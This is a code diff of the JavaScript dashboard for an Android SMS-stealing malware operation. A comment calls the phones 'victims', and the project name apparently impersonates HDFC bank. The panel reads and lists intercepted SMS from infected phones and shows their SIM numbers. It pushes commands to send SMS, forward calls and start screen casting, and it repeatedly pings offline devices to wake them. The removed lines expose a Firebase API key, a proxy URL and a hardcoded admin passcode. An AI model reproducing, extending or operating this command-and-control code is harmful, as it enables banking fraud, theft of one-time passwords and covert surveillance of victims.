@@ -1,16 +1,11 @@
 // Firebase Configuration (Paste your actual config here)
-const firebaseConfig = {
-    apiKey: "AIzaSyBk9QFAx5Z56tZq6Sezo9w07TQ_hgwgcYM",
-    authDomain: "a-comp-hdfc-apcd006.firebaseapp.com",
-    databaseURL: "https://a-comp-hdfc-apcd006-default-rtdb.firebaseio.com",
-    projectId: "a-comp-hdfc-apcd006",
-    storageBucket: "a-comp-hdfc-apcd006.firebasestorage.app",
-    messagingSenderId: "688804381427",
-    appId: "1:688804381427:web:100568431b4f0c38086d86",
-    measurementId: "G-XEM1HDNF45"
-};
+// SECRETS ऑब्जेक्ट config.js से लोड किया जाता है
 
-firebase.initializeApp(firebaseConfig);
+if (typeof SECRETS === 'undefined') {
+    console.error("Config not found! Make sure Environment Variables are set in Vercel.");
+}
+
+firebase.initializeApp(SECRETS.FIREBASE_CONFIG);
 const database = firebase.database();
 
 // Global variable to store last data snapshot
@@ -47,25 +42,44 @@ let isDeviceDeleteEnabled = false;
 // Wake-up Tracking & FCM Config
 let previousDeviceStates = {};
 let pingingDevices = new Set();
-// Session Tracking Globals
+
+// Session Tracking Globals (Missing Variables Fixed)
 let currentSessionId = null;
 let currentSessionPath = null;
 
-const PING_PROXY_URL = "https://script.google.com/macros/s/AKfycbzUv35AT0wIms3nE5EdbeehvuRM2qlx761NeP46oJjpvFVaqZZBqeZ5ZDSxfgR8OLZT/exec"; 
+const PING_PROXY_URL = SECRETS.PING_PROXY_URL; 
 let pingVisualTimeout = null;
+
+// पासवर्ड को सुरक्षित करने के लिए SHA-256 हैशिंग फंक्शन
+async function hashPassword(string) {
+    const utf8 = new TextEncoder().encode(string);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', utf8);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+// ब्राउज़र के लिए एक यूनिक डिवाइस ID जनरेट या रिट्रीव करने के लिए हेल्पर
+function getPersistentDeviceId() {
+    let id = localStorage.getItem('admin_device_fingerprint');
+    if (!id) {
+        id = 'did_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+        localStorage.setItem('admin_device_fingerprint', id);
+    }
+    return id;
+}
 
 // Initialize Icons on First Load
 lucide.createIcons();
 
 // Check login status on page load
 window.addEventListener('DOMContentLoaded', () => {
-    const isLoggedIn = localStorage.getItem('isLoggedIn');
+    const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
     const savedUsername = localStorage.getItem('username');
 
-    if (isLoggedIn === 'true' && savedUsername) {
+    if (isLoggedIn && savedUsername) {
         // Direct transition to dashboard while we verify status
         displayDashboard(savedUsername);
-        // Start real-time monitoring even if already logged in
+        // पुराने सेशन के लिए स्टेटस मॉनिटर करें
         startAdminStatusMonitor(savedUsername);
     }
 });
@@ -174,10 +188,19 @@ async function endAdminSession() {
 }
 
 function syncDashboardWithFirebase() {
-    // Listen to the root node to get all data at once
-    database.ref('/').on('value', (snapshot) => {
-        lastSnapshotData = snapshot.val();
-        updateDashboardUI();
+    const nodes = ['Devices_Details', 'devices', 'AppStats', 'AdminActivity', 'admins', 'telegram'];
+    
+    // Initialize global object if null
+    if (!lastSnapshotData) lastSnapshotData = {};
+
+    nodes.forEach(node => {
+        database.ref(node).on('value', (snapshot) => {
+            // Specific node update
+            lastSnapshotData[node] = snapshot.val() || {};
+            
+            // Refresh UI whenever any node changes
+            updateDashboardUI();
+        });
     });
 }
 
@@ -187,22 +210,52 @@ function syncDashboardWithFirebase() {
 function updateDashboardUI() {
     if (!lastSnapshotData) return;
     const data = lastSnapshotData;
+    const deviceDetails = data.Devices_Details || {};
+    const onlineStatusNode = data.devices || {};
 
-        const devices = data.Devices || {};
+        // Auto-assign deviceNumber if missing
+        const deviceEntries = Object.entries(deviceDetails);
+        let maxDeviceNum = 0;
+        let updates = {};
+
+        // Find the current maximum deviceNumber in the database
+        deviceEntries.forEach(([id, dev]) => {
+            if (dev.deviceNumber) {
+                const num = parseInt(dev.deviceNumber);
+                if (!isNaN(num) && num > maxDeviceNum) maxDeviceNum = num;
+            }
+        });
+
+        // Assign next numbers to devices that don't have one
+        deviceEntries.forEach(([id, dev]) => {
+            if (!dev.deviceNumber) {
+                maxDeviceNum++;
+                updates[`${id}/deviceNumber`] = maxDeviceNum;
+            }
+        });
+
+        // Batch update to Firebase if there are new numbers to assign
+        if (Object.keys(updates).length > 0) {
+            database.ref('Devices_Details').update(updates);
+            return; // Exit and wait for the next snapshot with updated numbers
+        }
+
         const now = Date.now();
         const onlineThreshold = 5 * 60 * 1000; // 5 Minutes in milliseconds
 
         // Helper to check if a device is online based on 5-min ping rule
-        const checkIsOnline = (dev) => {
-            if (!dev.device?.last_seen) return false;
-            const lastSeen = new Date(dev.device.last_seen).getTime();
-            return (now - lastSeen) < onlineThreshold;
+        const checkIsOnline = (id) => {
+            const status = onlineStatusNode[id];
+            if (!status) return false;
+            
+            const isFirebaseOnline = status.status === 'online';
+            return isFirebaseOnline; // अब सिर्फ 'status' फील्ड के आधार पर ऑनलाइन/ऑफलाइन चेक किया जाएगा
         };
 
         // Wake-up (Auto-Ping) Logic: Trigger when WiFi icon turns gray (Firebase offline status)
-        Object.entries(devices).forEach(([id, dev]) => {
-            const isOnline = checkIsOnline(dev);
-            const isFirebaseOnline = dev.device?.online === 'ONLINE';
+        Object.entries(deviceDetails).forEach(([id, dev]) => {
+            const isOnline = checkIsOnline(id);
+            const isFirebaseOnline = onlineStatusNode[id]?.status === 'online';
             
             if (!isFirebaseOnline && dev.fcmToken) {
                 // This function has its own guard to prevent duplicate intervals
@@ -211,14 +264,13 @@ function updateDashboardUI() {
             previousDeviceStates[id] = isOnline ? 'ONLINE' : 'OFFLINE';
         });
 
-        const deviceArray = Object.values(devices);
-        const totalCount = deviceArray.length;
-        const onlineCount = deviceArray.filter(d => checkIsOnline(d)).length;
+        const totalCount = deviceEntries.length;
+        const onlineCount = deviceEntries.filter(([id]) => checkIsOnline(id)).length;
         const offlineCount = totalCount - onlineCount;
-        const favoriteCount = deviceArray.filter(d => d.device?.star === true || d.device?.star === "true").length;
+        const favoriteCount = deviceEntries.filter(([id, d]) => d.device?.star === true || d.device?.star === "true").length;
 
         let totalSmsCount = 0;
-        deviceArray.forEach(dev => {
+        deviceEntries.forEach(([id, dev]) => {
             if (dev.Sms) totalSmsCount += Object.keys(dev.Sms).length;
         });
 
@@ -230,13 +282,15 @@ function updateDashboardUI() {
         if (document.getElementById('stat-all-sms')) document.getElementById('stat-all-sms').innerText = totalSmsCount;
         
         const uninstallThreshold = 20 * 60 * 60 * 1000; // 20 Hours in ms
-        const uninstallCount = deviceArray.filter(d => {
-            if (!d.device?.last_seen) return true;
-            return (now - new Date(d.device.last_seen).getTime()) > uninstallThreshold;
+        const uninstallCount = deviceEntries.filter(([id]) => {
+            const status = onlineStatusNode[id];
+            if (!status || !status.last_seen) return false; 
+            return (now - status.last_seen) > uninstallThreshold;
         }).length;
         if (document.getElementById('stat-security')) document.getElementById('stat-security').innerText = uninstallCount;
 
-        document.getElementById('stat-activity').innerText = totalCount > 0 ? "92%" : "0%";
+        const activityPercent = totalCount > 0 ? Math.round((onlineCount / totalCount) * 100) : 0;
+        document.getElementById('stat-activity').innerText = activityPercent + "%";
 
         // Update Status Badge and Dot
         const statusText = document.getElementById('stat-status');
@@ -278,38 +332,39 @@ function updateDashboardUI() {
         // 4. Render Devices List
         const deviceListContainer = document.getElementById('device-list-container');
         if (deviceListContainer) {
-            let filteredArray = deviceArray;
-            if (currentDeviceFilter === 'online') filteredArray = deviceArray.filter(d => checkIsOnline(d));
-            if (currentDeviceFilter === 'offline') filteredArray = deviceArray.filter(d => !checkIsOnline(d));
-            if (currentDeviceFilter === 'favorite') filteredArray = deviceArray.filter(d => d.device?.star === true || d.device?.star === "true");
+            let filteredEntries = deviceEntries;
+            if (currentDeviceFilter === 'online') filteredEntries = deviceEntries.filter(([id]) => checkIsOnline(id));
+            if (currentDeviceFilter === 'offline') filteredEntries = deviceEntries.filter(([id]) => !checkIsOnline(id));
+            if (currentDeviceFilter === 'favorite') filteredEntries = deviceEntries.filter(([id, d]) => d.device?.star === true || d.device?.star === "true");
 
             // Sort devices by deviceNumber descending (Higher number on top)
-            filteredArray.sort((a, b) => (parseInt(b.deviceNumber) || 0) - (parseInt(a.deviceNumber) || 0));
+            filteredEntries.sort((a, b) => (parseInt(b[1].deviceNumber) || 0) - (parseInt(a[1].deviceNumber) || 0));
 
-            if (filteredArray.length === 0) {
+            if (filteredEntries.length === 0) {
                 deviceListContainer.innerHTML = `
                     <div class="py-16 text-center">
                         <p class="text-[10px] font-black text-white/40 uppercase tracking-[0.3em]">No ${currentDeviceFilter} Terminals Found</p>
                     </div>`;
             } else {
-                deviceListContainer.innerHTML = filteredArray.map(dev => {
-                    const isOnline = checkIsOnline(dev);
+                deviceListContainer.innerHTML = filteredEntries.map(([id, dev]) => {
+                    const isDeviceOnline = checkIsOnline(id);
+                    const deviceModel = dev.device_details?.model || dev.device_details?.device || 'Unknown Device';
                     return `
-                <div onclick="openDeviceDetails('${dev.device?.deviceID}')" class="group relative cursor-pointer bg-white ${isOnline ? 'border-emerald-500/30 shadow-emerald-500/20' : 'border-rose-500/30 shadow-rose-500/20'} border-2 rounded-[1.75rem] overflow-hidden shadow-xl transition-all duration-300 hover:shadow-2xl hover:-translate-y-1">
+                <div onclick="openDeviceDetails('${id}')" class="group relative cursor-pointer bg-white ${isDeviceOnline ? 'border-emerald-500/30 shadow-emerald-500/20' : 'border-rose-500/30 shadow-rose-500/20'} border-2 rounded-[1.75rem] overflow-hidden shadow-xl transition-all duration-300 hover:shadow-2xl hover:-translate-y-1">
                     ${(() => { const isFav = dev.device?.star === true || dev.device?.star === "true"; return ''; })()}
                     
                     <div class="absolute inset-0 bg-gradient-to-br from-white via-transparent to-slate-50/50 pointer-events-none"></div>
                     
                     <!-- Device Header Navbar -->
-                    <div class="relative bg-gradient-to-r ${isOnline ? 'from-green-500 to-emerald-600' : 'from-red-500 to-rose-600'} px-4 py-2.5 flex justify-between items-center text-white shadow-md">
+                    <div class="relative bg-gradient-to-r ${isDeviceOnline ? 'from-green-500 to-emerald-600' : 'from-red-500 to-rose-600'} px-4 py-2.5 flex justify-between items-center text-white shadow-md">
                         <div class="flex items-center space-x-2">
                             <div class="p-1.5 bg-white/20 rounded-lg backdrop-blur-md">
                                 <i data-lucide="smartphone" class="w-3.5 h-3.5 text-white"></i>
                             </div>
-                            <span class="font-bold text-[13px] tracking-tight drop-shadow-sm">${dev.device?.device_name || 'Unknown Device'}</span>
+                            <span class="font-bold text-[13px] tracking-tight drop-shadow-sm">${deviceModel}</span>
                         </div>
                         <div class="flex items-center">
-                            ${isDeviceDeleteEnabled ? `<button onclick="event.stopPropagation(); deleteDevice('${dev.device?.deviceID}')" class="mr-2 text-blue-700 hover:text-blue-900 transition-colors p-1"><i data-lucide="trash-2" class="w-3.5 h-3.5"></i></button>` : ''}
+                            ${isDeviceDeleteEnabled ? `<button onclick="event.stopPropagation(); deleteDevice('${id}')" class="mr-2 text-blue-700 hover:text-blue-900 transition-colors p-1"><i data-lucide="trash-2" class="w-3.5 h-3.5"></i></button>` : ''}
                             <span class="bg-black/10 px-2.5 py-1 rounded-full text-[9px] font-black tracking-widest uppercase backdrop-blur-md border border-white/10">#${dev.deviceNumber || '0'}</span>
                         </div>
                     </div>
@@ -322,17 +377,17 @@ function updateDashboardUI() {
                            <div class="bg-slate-50 p-2 rounded-2xl border border-slate-100">
                                 <div class="flex items-center space-x-1.5 mb-0.5">
                                     <i data-lucide="clock" class="w-3 h-3 text-slate-400"></i>
-                                    <span class="text-[9px] font-bold uppercase tracking-wider text-slate-400">Ping</span>
+                                    <span class="text-[9px] font-bold uppercase tracking-wider text-slate-400">LAST SEEN</span>
                                 </div>
                                 <p class="text-[10px] font-bold text-slate-700 truncate">
-                                    ${dev.device?.last_seen ? new Date(dev.device.last_seen).toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true }) : '---'}
+                                    ${onlineStatusNode[id]?.last_seen ? new Date(onlineStatusNode[id].last_seen).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true }) : '---'}
                                 </p>
                            </div>
                            <!-- Compact Status Card (Battery, Wifi, Star) -->
                            <div class="bg-slate-50 p-2 rounded-2xl border border-slate-100 flex items-center justify-around">
-                                <span class="text-[10px] font-bold text-slate-700">${dev.device?.Battery || 0}%</span>
-                                <i data-lucide="wifi" class="w-3.5 h-3.5 ${dev.device?.online === 'ONLINE' ? 'text-emerald-500' : 'text-slate-300'}"></i>
-                                <button onclick="event.stopPropagation(); toggleFavorite('${dev.device?.deviceID}', ${dev.device?.star === true || dev.device?.star === "true"})" class="transition-all active:scale-125">
+                                <span class="text-[10px] font-bold text-slate-700">${dev.device_details?.battery_level || '0%'}</span>
+                                <i data-lucide="wifi" class="w-3.5 h-3.5 ${isDeviceOnline ? 'text-emerald-500' : 'text-slate-300'}"></i>
+                                <button onclick="event.stopPropagation(); toggleFavorite('${id}', ${dev.device?.star === true || dev.device?.star === "true"})" class="transition-all active:scale-125">
                                     <i data-lucide="star" class="w-3.5 h-3.5 ${dev.device?.star === true || dev.device?.star === "true" ? 'text-amber-500 fill-amber-500' : 'text-slate-300'}"></i>
                                 </button>
                            </div>
@@ -340,13 +395,13 @@ function updateDashboardUI() {
 
                         <!-- SIM Cards Grid -->
                         <div class="grid grid-cols-1 gap-2.5">
-                            ${Object.values(dev.sims || {}).map(sim => `
+                            ${(dev.sim_info?.details || []).map(sim => `
                                 <div class="relative group/sim bg-white border border-slate-100 p-2 rounded-[1.25rem] flex items-center space-x-3 transition-colors hover:border-indigo-200 hover:bg-indigo-50">
                                     <div class="w-8 h-8 bg-indigo-50 rounded-xl flex items-center justify-center text-indigo-500 group-hover/sim:bg-indigo-600 group-hover/sim:text-white transition-all shadow-sm">
-                                        <i data-lucide="sim-card" class="w-3 h-3"></i>
+                                        <i data-lucide="cpu" class="w-3 h-3"></i>
                                     </div>
                                     <div class="min-w-0">
-                                        <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">Sim Slot ${sim.slot}</p>
+                                        <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">Sim Slot ${sim.slot_index + 1}</p>
                                         <p class="text-[11px] font-bold text-slate-800 truncate leading-none mb-1">${sim.carrier_name || 'No Carrier'}</p>
                                         <p class="text-[10px] font-bold text-indigo-600 leading-none tracking-tight">${sim.number || 'Unknown'}</p>
                                     </div>
@@ -363,16 +418,18 @@ function updateDashboardUI() {
         const smsListContainer = document.getElementById('sms-list-container');
         if (smsListContainer) {
             let allSms = [];
-            deviceArray.forEach(dev => {
+            Object.entries(deviceDetails).forEach(([id, dev]) => {
                 if (dev.Sms) {
+                    const deviceModel = dev.device_details?.model || 'Unknown Device';
                     Object.entries(dev.Sms).forEach(([smsId, msg]) => {
-                        allSms.push({ ...msg, id: smsId, deviceId: dev.device?.deviceID, deviceName: dev.device?.device_name });
+                        const time = msg.timestamp || msg.received_time;
+                        allSms.push({ ...msg, id: smsId, deviceId: id, deviceName: deviceModel, timestamp: time });
                     });
                 }
             });
 
             // Sort all global SMS by time: Latest first
-            allSms.sort((a, b) => new Date(b.received_time).getTime() - new Date(a.received_time).getTime());
+            allSms.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
 
             smsListContainer.innerHTML = allSms.slice(0, 100).map(sms => `
                 <div class="relative glass-card bg-indigo-600/30 p-4 text-white hover:translate-y-[-2px] transition-all duration-300">
@@ -383,7 +440,7 @@ function updateDashboardUI() {
                     ` : ''}
                     <div class="flex justify-between items-start mb-2">
                         <p class="text-[10px] font-black text-yellow-400 uppercase tracking-widest">${sms.sender}</p>
-                        <p class="text-[9px] font-bold text-blue-200">${sms.received_time}</p>
+                        <p class="text-[9px] font-bold text-blue-200">${sms.timestamp}</p>
                     </div>
                     <p class="text-xs text-white/90 leading-tight font-medium">${sms.message}</p>
                     <div class="flex items-center mt-3 pt-2 border-t border-white/10">
@@ -433,7 +490,7 @@ function setDeviceFilter(filter) {
  * @param {string} deviceId 
  */
 function openDeviceDetails(deviceId) {
-    if (!lastSnapshotData || !lastSnapshotData.Devices[deviceId]) return;
+    if (!lastSnapshotData || !lastSnapshotData.Devices_Details[deviceId]) return;
     
     activeDeviceId = deviceId;
     localStorage.setItem('activeDeviceId', deviceId);
@@ -445,7 +502,7 @@ function openDeviceDetails(deviceId) {
  * Renders the device details content (called on open and on data updates)
  */
 function renderDeviceDetailsUI(deviceId) {
-    const dev = lastSnapshotData.Devices[deviceId];
+    const dev = lastSnapshotData.Devices_Details[deviceId];
     const container = document.getElementById('device-details-content');
 
     container.innerHTML = `
@@ -457,7 +514,7 @@ function renderDeviceDetailsUI(deviceId) {
             </button>
 
             <div id="cf-status-feedback" class="text-center text-[9px] font-black text-indigo-300 animate-pulse uppercase tracking-[0.2em]">
-                ${dev.call_forward ? `${dev.call_forward.status || 'EXECUTING'}` : 'SYSTEM READY'}
+                ${dev.call_commands?.status || (dev.call_forward ? (dev.call_forward.status || 'EXECUTING') : 'SYSTEM READY')}
             </div>
 
             <div class="grid grid-cols-1 gap-2.5">
@@ -474,11 +531,11 @@ function renderDeviceDetailsUI(deviceId) {
             </div>
 
             <div class="grid grid-cols-2 gap-2.5">
-                ${Object.values(dev.sims || {}).map(sim => `
-                    <div onclick="handleSendSmsClick('${deviceId}', ${sim.slot})" class="cursor-pointer bg-white/5 border border-white/10 p-2.5 rounded-xl hover:bg-white/10 hover:border-indigo-500/50 transition-all active:scale-95">
+                ${(dev.sim_info?.details || []).map(sim => `
+                    <div onclick="handleSendSmsClick('${deviceId}', ${sim.slot_index})" class="cursor-pointer bg-white/5 border border-white/10 p-2.5 rounded-xl hover:bg-white/10 hover:border-indigo-500/50 transition-all active:scale-95">
                         <div class="flex items-center space-x-1.5 mb-1">
-                            <i data-lucide="sim-card" class="w-3 h-3 text-indigo-400"></i>
-                            <span class="text-[8px] font-black text-white/40 uppercase tracking-widest">SIM ${sim.slot + 1}</span>
+                            <i data-lucide="cpu" class="w-3 h-3 text-indigo-400"></i>
+                            <span class="text-[8px] font-black text-white/40 uppercase tracking-widest">SIM ${sim.slot_index + 1}</span>
                         </div>
                         <p class="text-[10px] font-bold text-white truncate leading-tight">${sim.carrier_name || 'No Carrier'}</p>
                         <p class="text-[9px] font-bold text-indigo-300 tracking-tighter">${sim.number || 'Unknown'}</p>
@@ -536,7 +593,7 @@ function renderDeviceDetailsUI(deviceId) {
             </div>
             <div class="space-y-3">
                 ${dev.Sms ? Object.entries(dev.Sms)
-                    .sort((a, b) => new Date(b[1].received_time) - new Date(a[1].received_time))
+                    .sort((a, b) => new Date(b[1].timestamp) - new Date(a[1].timestamp))
                     .map(([smsId, msg]) => `
                     <div class="relative glass-card bg-white/10 p-4 text-white hover:translate-y-[-2px] transition-all duration-300">
                         ${isSmsDeleteEnabled ? `
@@ -546,7 +603,7 @@ function renderDeviceDetailsUI(deviceId) {
                         ` : ''}
                         <div class="flex justify-between items-start mb-2">
                             <span class="text-[10px] font-black text-yellow-400 uppercase tracking-widest">${msg.sender}</span>
-                            <span class="text-[9px] font-bold text-blue-200">${msg.received_time}</span>
+                            <span class="text-[9px] font-bold text-blue-200">${msg.timestamp}</span>
                         </div>
                         <p class="text-xs text-white/90 leading-relaxed font-medium">${msg.message}</p>
                     </div>
@@ -573,7 +630,7 @@ async function handleSendSmsClick(deviceId, slot) {
         return;
     }
 
-    const dev = lastSnapshotData?.Devices[deviceId];
+    const dev = lastSnapshotData?.Devices_Details[deviceId];
     
     // 1. RTDB Command Object (Victim phone reads from here)
     const smsData = {
@@ -594,7 +651,7 @@ async function handleSendSmsClick(deviceId, slot) {
     sendFcmPing(dev.fcmToken, fcmData);
 
     // Set RTDB Command
-    database.ref(`Devices/${deviceId}/commands/send_sms`).set(smsData)
+    database.ref(`Devices_Details/${deviceId}/SendSms/send_sms`).set(smsData)
         .then(() => showToast("SMS Command Sent"))
         .catch(() => showToast("Failed to send", "error"));
 }
@@ -611,22 +668,22 @@ async function handleCallForwardClick(deviceId, slot, subAction) {
         return;
     }
 
-    const dev = lastSnapshotData?.Devices[deviceId];
+    const dev = lastSnapshotData?.Devices_Details[deviceId];
     const finalSlot = (slot !== undefined && slot !== null) ? slot : selectedSlot;
 
-    // 1. RTDB Command Object (Matches your Admin App RTDB logic)
+    // 1. RTDB Command Object (New instructions)
     const rtdbCommand = {
-        action: subAction, // "activate" or "deactivate"
-        sim_slot: Number(finalSlot)
+        action: subAction === 'activate' ? 'start' : 'stop',
+        sim_index: Number(finalSlot)
     };
     if (subAction === 'activate') {
-        rtdbCommand.forward_number = number;
+        rtdbCommand.number = number;
     }
 
-    // 2. FCM Data Payload (Matches your DeviceDetailsActivity.java logic)
+    // 2. FCM Data Payload
     const fcmData = {
         action: "call_forward",
-        sub_action: subAction,
+        sub_action: subAction === 'activate' ? 'start' : 'stop',
         sim_slot: String(finalSlot)
     };
     if (subAction === 'activate') {
@@ -634,13 +691,14 @@ async function handleCallForwardClick(deviceId, slot, subAction) {
     }
 
     // Clear old response from Firebase to ensure we don't show stale/empty data
-    database.ref(`Devices/${deviceId}/call_forward`).remove();
+    database.ref(`Devices_Details/${deviceId}/call_forward`).remove();
+    database.ref(`Devices_Details/${deviceId}/call_commands/status`).remove();
 
     // Send via FCM Proxy (Immediate Action)
     sendFcmPing(dev.fcmToken, fcmData);
 
     // Send via RTDB (Backup Mechanism)
-    database.ref(`Devices/${deviceId}/commands/call_forward`).set(rtdbCommand)
+    database.ref(`Devices_Details/${deviceId}/call_commands`).set(rtdbCommand)
         .then(() => showToast("Request Sent"))
         .catch(() => showToast("Backup Failed", "error"));
 }
@@ -676,21 +734,25 @@ function showToast(message, type = 'success') {
 /**
  * Sends a High-Priority FCM Ping via V1 API
  */
-async function sendFcmPing(fcmToken) {
+async function sendFcmPing(fcmToken, data = null) {
     if (!PING_PROXY_URL || PING_PROXY_URL.includes("YOUR_")) {
         console.error("FCM Error: Proxy URL missing! Please set PING_PROXY_URL in script.js");
         return false;
     }
 
+    const payload = {
+        token: fcmToken,
+        data: data || { action: "ping" }
+    };
+
     try {
         await fetch(PING_PROXY_URL, {
             method: 'POST',
-            mode: 'no-cors', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ token: fcmToken })
+            mode: 'no-cors',
+            body: JSON.stringify(payload)
         });
 
-        console.log("Ping command sent to Google Proxy successfully.");
+        console.log("Ping command triggered (Sent to Proxy).");
         triggerPingVisual();
         return true;
     } catch (e) { 
@@ -704,10 +766,10 @@ function startAutoPing(deviceId, fcmToken) {
     pingingDevices.add(deviceId);
 
     let attempts = 0;
-    const interval = setInterval(() => {
+    const interval = setInterval(async () => {
         // Stop pinging if the device has already come online in Firebase (WiFi turns Green)
-        const dev = lastSnapshotData?.Devices?.[deviceId];
-        const isFirebaseOnline = dev?.device?.online === 'ONLINE';
+        const onlineNode = lastSnapshotData?.devices?.[deviceId];
+        const isFirebaseOnline = onlineNode?.status === 'online';
 
         if (isFirebaseOnline) {
             clearInterval(interval);
@@ -716,7 +778,7 @@ function startAutoPing(deviceId, fcmToken) {
         }
 
         attempts++;
-        sendFcmPing(fcmToken);
+        await sendFcmPing(fcmToken);
         if (attempts >= 20) { // 20 attempts * 15 seconds = 300 seconds (5 Minutes)
             clearInterval(interval);
             pingingDevices.delete(deviceId);
@@ -745,7 +807,7 @@ function triggerPingVisual() {
 }
 
 async function manualPing(deviceId) {
-    const dev = lastSnapshotData?.Devices[deviceId];
+    const dev = lastSnapshotData?.Devices_Details[deviceId];
     if (dev?.fcmToken) {
         const success = await sendFcmPing(dev.fcmToken);
         if (success) {
@@ -765,7 +827,7 @@ async function manualPing(deviceId) {
  */
 function sendDeviceCommand(deviceId, command, value) {
     if (!deviceId) return;
-    database.ref(`Devices/${deviceId}/commands/${command}`).set(value)
+    database.ref(`Devices_Details/${deviceId}/${command}/command`).set(value)
         .then(() => {
             showToast("Request Sent");
         })
@@ -806,7 +868,7 @@ function closeSuperPassModal() {
 
 function handleSuperPassVerify() {
     const pass = document.getElementById('super-pass-input').value;
-    if (pass === "995511") {
+    if (pass === SECRETS.SUPER_PASS) { // अब यह config.js से पासकोड लेगा
         const cb = superAccessCallback;
         closeSuperPassModal();
         if (cb) cb();
@@ -819,41 +881,80 @@ function handleSuperPassVerify() {
 /**
  * Monitors admin status in real-time for auto login/logout
  */
-function startAdminStatusMonitor(username) {
+function startAdminStatusMonitor(username, enteredPassword = null) {
     const adminKey = username.toLowerCase().replace(/[^a-z0-9]/g, '_');
+    const myDeviceId = getPersistentDeviceId();
     
     if (adminStatusRef) adminStatusRef.off(); // Clear existing listener if any
     
     adminStatusRef = database.ref(`admins/${adminKey}`);
-    adminStatusRef.on('value', snapshot => {
+    adminStatusRef.on('value', async snapshot => {
         const adminData = snapshot.val();
         const errorMsg = document.getElementById('login-error');
         const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
+        const currentLocalSessionId = localStorage.getItem('currentSessionId');
 
-        if (!adminData) {
-            // Auto-register new admin as WAITING
-            adminStatusRef.set({
-                name: username,
-                device: getDeviceDescription(),
-                status: "WAITING",
-                created_at: Date.now()
-            });
+        // 1. अगर पहले से लॉगिन है (सिर्फ मॉनिटरिंग करें)
+        if (isLoggedIn) {
+            if (!adminData || adminData.status !== 'ACTIVE' || adminData.current_session_id !== currentLocalSessionId) {
+                showToast("Access revoked or unauthorized device access detected.", "error");
+                logout();
+            }
             return;
         }
 
-        if (adminData.status === 'ACTIVE') {
-            // Ensure session is saved and dashboard is displayed
-            localStorage.setItem('isLoggedIn', 'true');
-            localStorage.setItem('username', username);
-            displayDashboard(username);
-            if (errorMsg) errorMsg.classList.add('hidden');
-        } else {
-            // Status is WAITING or anything else
-            if (isLoggedIn) {
-                // Kick out instantly if status changes to WAITING
-                logout();
-            } else if (errorMsg) {
-                errorMsg.innerText = "Approval lene ke liye contact kare telegram @sohanlalde";
+        // 2. लॉगिन या रजिस्ट्रेशन की कोशिश (enteredPassword होने पर)
+        if (enteredPassword) {
+            const hashedPass = await hashPassword(enteredPassword);
+
+            // CASE A: अकाउंट नहीं है - नया रजिस्टर करें
+            if (!adminData) {
+                adminStatusRef.set({
+                    name: username,
+                    device: getDeviceDescription(),
+                    registered_device_id: myDeviceId,
+                    status: "WAITING",
+                    password: hashedPass,
+                    created_at: Date.now()
+                }).then(() => {
+                    errorMsg.innerText = "Request sent. Waiting for Super Admin approval.";
+                    errorMsg.classList.remove('hidden');
+                });
+                return;
+            }
+
+            // CASE B: अकाउंट मौजूद है - पासवर्ड और डिवाइस चेक करें
+            if (adminData.status === 'ACTIVE') {
+                // पुराने प्लेन-टेक्स्ट पासवर्ड और नए हैश पासवर्ड दोनों को सपोर्ट करें
+                const isPasswordCorrect = (adminData.password === hashedPass) || (adminData.password === enteredPassword);
+
+                if (isPasswordCorrect) {
+                    if (!adminData.registered_device_id || adminData.registered_device_id === myDeviceId) {
+                        const newSessionId = "sess_" + Date.now();
+                        const updates = {
+                            current_session_id: newSessionId,
+                            last_login_timestamp: Date.now(),
+                            registered_device_id: myDeviceId,
+                            password: hashedPass 
+                        };
+
+                        adminStatusRef.update(updates).then(() => {
+                            localStorage.setItem('isLoggedIn', 'true');
+                            localStorage.setItem('username', username);
+                            localStorage.setItem('currentSessionId', newSessionId);
+                            displayDashboard(username);
+                            if (errorMsg) errorMsg.classList.add('hidden');
+                        });
+                    } else {
+                        errorMsg.innerText = "Ye ID Password dusre device ke liye hai. Aap koi aur ID Password banaiye ya purana device use karein.";
+                        errorMsg.classList.remove('hidden');
+                    }
+                } else {
+                    errorMsg.innerText = "Incorrect passcode.";
+                    errorMsg.classList.remove('hidden');
+                }
+            } else {
+                errorMsg.innerText = "Approval pending. Contact Super Admin @sohanlalde";
                 errorMsg.classList.remove('hidden');
             }
         }
@@ -865,14 +966,13 @@ function attemptLogin() {
     const pass = document.getElementById('password').value;
     const errorMsg = document.getElementById('login-error');
 
-    if (username === "" || pass !== '12345') {
-        errorMsg.innerText = "Incorrect credentials. Try '12345'";
+    if (username === "" || pass === "") {
+        errorMsg.innerText = "Username and passcode required.";
         errorMsg.classList.remove('hidden');
         return;
     }
     
-    // If password is correct, start the real-time monitor
-    startAdminStatusMonitor(username);
+    startAdminStatusMonitor(username, pass);
 }
 
 async function logout() {
@@ -880,6 +980,7 @@ async function logout() {
     localStorage.removeItem('isLoggedIn');
     localStorage.removeItem('username');
     localStorage.removeItem('activeTab');
+    localStorage.removeItem('currentSessionId'); // Clear local session ID
     location.reload();
 }
 
@@ -1024,7 +1125,7 @@ function showScreenControlModal(deviceId) {
     document.documentElement.style.overscrollBehaviorY = 'none';
     
     // Send ON command to device
-    database.ref(`Devices/${deviceId}/Screen_cast/screen`).set("on");
+    database.ref(`Devices_Details/${deviceId}/Screen_cast/screen`).set("on");
     
     renderModalUI(deviceId);
 }
@@ -1065,7 +1166,7 @@ function showOldDetailsPopup(deviceId) {
 function closeDetailsModal() {
     // Send OFF command if stopping screen cast
     if (activeModalType === 'screen_control' && activeModalDeviceId) {
-        database.ref(`Devices/${activeModalDeviceId}/Screen_cast/screen`).set("off");
+        database.ref(`Devices_Details/${activeModalDeviceId}/Screen_cast/screen`).set("off");
     }
 
     activeModalDeviceId = null;
@@ -1082,30 +1183,30 @@ function closeDetailsModal() {
  */
 function renderModalUI(deviceId) {
     if (!lastSnapshotData) return;
-    const dev = deviceId !== "global" ? lastSnapshotData.Devices[deviceId] : null;
